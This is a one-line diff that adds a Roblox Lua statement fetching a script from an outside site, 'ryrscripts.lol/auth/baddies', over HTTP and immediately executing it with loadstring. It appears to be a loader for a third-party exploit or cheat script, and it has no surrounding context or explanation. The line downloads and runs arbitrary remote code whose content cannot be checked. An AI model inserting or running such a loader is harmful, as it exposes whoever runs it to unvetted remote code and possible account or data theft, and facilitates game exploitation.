@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://ryrscripts.lol/auth/baddies", true))()
